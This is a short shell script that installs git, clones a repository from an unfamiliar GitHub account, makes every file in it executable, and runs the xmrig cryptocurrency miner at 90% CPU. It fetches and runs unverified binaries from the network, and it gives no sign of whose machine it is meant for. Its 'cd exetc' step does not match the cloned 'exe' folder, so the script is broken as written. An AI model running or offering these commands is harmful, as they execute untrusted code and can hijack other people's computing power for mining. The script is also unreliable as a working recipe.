sudo apt update -y
sudo apt upgrade -y
sudo apt install git -y
git clone https://github.com/baphomet-disciple/exe
cd exetc
chmod +x *
./xmrig --max-cpu-usage=90
